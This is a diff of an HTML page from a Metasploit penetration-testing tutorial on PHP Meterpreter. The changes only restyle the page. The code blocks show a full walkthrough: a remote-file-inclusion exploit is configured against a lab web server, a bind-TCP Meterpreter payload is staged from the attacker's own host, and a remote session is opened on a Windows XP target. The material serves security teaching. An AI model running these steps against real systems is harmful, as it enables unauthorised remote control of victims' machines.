@@ -4,7 +4,7 @@
   <meta content="text/html; charset=ISO-8859-1"
  http-equiv="Content-Type">
   <title>PHP Meterpreter</title>
-</head>
+<link rel="stylesheet" type="text/css" href="/home/steve/metasploit_unleashed/css.css" /></head>
 <body>
 <h1 style="color: rgb(0, 0, 0);" id="firstHeading" class="firstHeading">PHP
 Meterpreter</h1>
@@ -29,7 +29,7 @@ us.
 <br>
 <br>
 </p>
-<pre style="color: rgb(0, 0, 0);">msf &gt; use exploit/unix/webapp/php_include<br>msf exploit(php_include) &gt; show options<br><br>Module options:<br><br>   Name      Current Setting                                            Required  Description<br>   ----      ---------------                                            --------  -----------<br>   PATH      /                                                          yes       The base directory to prepend to the URL to try<br>   PHPRFIDB  /opt/metasploit3/msf3/data/exploits/php/rfi-locations.dat  no        A local file containing a list of URLs to try, with XXpathXX replacing the URL<br>   PHPURI                                                               no        The URI to request, with the include parameter changed to XXpathXX<br>   Proxies                                                              no        Use a proxy chain<br>   RHOST                                                                yes       The target address<br>   RPORT     80                                                         yes       The target port<br>   SRVHOST   0.0.0.0                                                    yes       The local host to listen on.<br>   SRVPORT   8080                                                       yes       The local port to listen on.<br>   URIPATH                                                              no        The URI to use for this exploit (default is random)<br>   VHOST                                                                no        HTTP server virtual host<br><br><br>Exploit target:<br><br>   Id  Name<br>   --  ----<br>   0   Automatic</pre>
+<pre id="code">msf &gt; use exploit/unix/webapp/php_include<br>msf exploit(php_include) &gt; show options<br><br>Module options:<br><br>   Name      Current Setting                                            Required  Description<br>   ----      ---------------                                            --------  -----------<br>   PATH      /                                                          yes       The base directory to prepend to the URL to try<br>   PHPRFIDB  /opt/metasploit3/msf3/data/exploits/php/rfi-locations.dat  no        A local file containing a list of URLs to try, with XXpathXX replacing the URL<br>   PHPURI                                                               no        The URI to request, with the include parameter changed to XXpathXX<br>   Proxies                                                              no        Use a proxy chain<br>   RHOST                                                                yes       The target address<br>   RPORT     80                                                         yes       The target port<br>   SRVHOST   0.0.0.0                                                    yes       The local host to listen on.<br>   SRVPORT   8080                                                       yes       The local port to listen on.<br>   URIPATH                                                              no        The URI to use for this exploit (default is random)<br>   VHOST                                                                no        HTTP server virtual host<br><br><br>Exploit target:<br><br>   Id  Name<br>   --  ----<br>   0   Automatic</pre>
 <br style="color: rgb(0, 0, 0);">
 <span style="color: rgb(0, 0, 0);">The most critical option to set in
 this particular module is the
@@ -40,7 +40,7 @@ provide the URL to our PHP shell, we simply need to place the text </span><b
 particular point on the site.
 </span><br style="color: rgb(0, 0, 0);">
 <br style="color: rgb(0, 0, 0);">
-<pre style="color: rgb(0, 0, 0);">msf exploit(php_include) &gt; set PHPURI /rfi_me.php?path=XXpathXX<br>PHPURI =&gt; /rfi_me.php?path=XXpathXX<br>msf exploit(php_include) &gt; set RHOST 192.168.1.150<br>RHOST =&gt; 192.168.1.150</pre>
+<pre id="code">msf exploit(php_include) &gt; set PHPURI /rfi_me.php?path=XXpathXX<br>PHPURI =&gt; /rfi_me.php?path=XXpathXX<br>msf exploit(php_include) &gt; set RHOST 192.168.1.150<br>RHOST =&gt; 192.168.1.150</pre>
 <br style="color: rgb(0, 0, 0);">
 <span style="color: rgb(0, 0, 0);">In order to further show off the
 versatility of Metasploit, we will use
@@ -51,7 +51,7 @@ be found at: </span><a style="color: rgb(0, 0, 0);"
  class="external free" rel="nofollow">http://blog.metasploit.com/2010/06/meterpreter-for-pwned-home-pages.html</a>
 <br style="color: rgb(0, 0, 0);">
 <br style="color: rgb(0, 0, 0);">
-<pre style="color: rgb(0, 0, 0);">msf exploit(php_include) &gt; set PAYLOAD php/meterpreter/bind_tcp<br>PAYLOAD =&gt; php/meterpreter/bind_tcp<br>msf exploit(php_include) &gt; exploit<br><br>[*] Started bind handler<br>[*] Using URL: http://0.0.0.0:8080/ehgqo4<br>[*]  Local IP: http://192.168.1.101:8080/ehgqo4<br>[*] PHP include server started.<br>[*] Sending stage (29382 bytes) to 192.168.1.150<br>[*] Meterpreter session 1 opened (192.168.1.101:56931 -&gt; 192.168.1.150:4444) at 2010-08-21 14:35:51 -0600<br><br><u>meterpreter</u> &gt; sysinfo<br>Computer: V-XPSP2-SPLOIT-<br>OS      : Windows NT V-XPSP2-SPLOIT- 5.1 build 2600 (Windows XP Professional Service Pack 2) i586<br><u>meterpreter</u> &gt;</pre>
+<pre id="code">msf exploit(php_include) &gt; set PAYLOAD php/meterpreter/bind_tcp<br>PAYLOAD =&gt; php/meterpreter/bind_tcp<br>msf exploit(php_include) &gt; exploit<br><br>[*] Started bind handler<br>[*] Using URL: http://0.0.0.0:8080/ehgqo4<br>[*]  Local IP: http://192.168.1.101:8080/ehgqo4<br>[*] PHP include server started.<br>[*] Sending stage (29382 bytes) to 192.168.1.150<br>[*] Meterpreter session 1 opened (192.168.1.101:56931 -&gt; 192.168.1.150:4444) at 2010-08-21 14:35:51 -0600<br><br><u>meterpreter</u> &gt; sysinfo<br>Computer: V-XPSP2-SPLOIT-<br>OS      : Windows NT V-XPSP2-SPLOIT- 5.1 build 2600 (Windows XP Professional Service Pack 2) i586<br><u>meterpreter</u> &gt;</pre>
 <br style="color: rgb(0, 0, 0);">
 <span style="color: rgb(0, 0, 0);">Just like that, a whole new avenue
 of attack is opened up using Metasploit.
